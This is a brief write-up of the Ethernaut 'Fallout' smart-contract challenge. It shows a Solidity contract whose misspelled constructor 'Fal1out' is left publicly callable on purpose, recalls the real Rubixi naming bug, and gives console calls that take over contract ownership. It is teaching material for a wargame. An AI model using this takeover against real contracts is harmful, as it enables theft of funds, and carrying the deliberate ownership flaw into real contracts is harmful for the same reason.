# Fallout

```javascript
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract Fallout is Ownable {

  mapping (address => uint) allocations;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  function allocate() public payable {
    allocations[msg.sender] += msg.value;
  }

  function sendAllocation(address allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(this.balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

Here's a real problem that a smart contract called `DynamicPyramid` want to change its name to `Rubixi`, but forget to change its name like following:
![](https://i.imgur.com/Vp0bItN.png)
Source code:
https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code

To this chanllenge, just call this contract's fault construct `Fal1out` like normal function, then you can change its owner to you.
![](https://i.imgur.com/8Wi8MgH.png)

```javascript
contract.owner() // check the owner
contract.Fal1out() //call the fatal construct
contract.owner() // check the owner change or not
```

By the way, this lesson also tells us that font-style in IDE really makes something matter.